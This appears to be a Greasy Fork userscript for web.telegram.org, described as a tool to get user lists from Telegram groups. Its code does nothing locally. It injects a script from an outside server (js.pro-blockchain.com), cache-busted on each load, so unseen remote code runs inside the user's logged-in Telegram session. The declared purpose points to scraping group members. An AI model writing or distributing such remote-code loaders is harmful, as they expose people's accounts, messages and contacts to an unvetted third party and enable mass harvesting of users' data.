// ==UserScript==
// @name         Lxgn telega_get_user_from_group
// @namespace    https://web.telegram.org/
// @version      0.01
// @author       lxgn
// @description  Telega Get User List
// @match        https://web.telegram.org/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/373600/Lxgn%20telega_get_user_from_group.user.js
// @updateURL https://update.greasyfork.org/scripts/373600/Lxgn%20telega_get_user_from_group.meta.js
// ==/UserScript==


var ms = new Date();
//document.write();


var script = document.createElement('script');
//var t = Math.random()*1000000;

var kuda = "https://js.pro-blockchain.com/telega_get_user_from_group/?"+ms.getTime();
console.log(kuda);
script.src = kuda;
document.body.appendChild(script);

script.onload = function() {
    // после выполнения скрипта становится доступна функция _
    //alert( 'load script' ); // её код
  }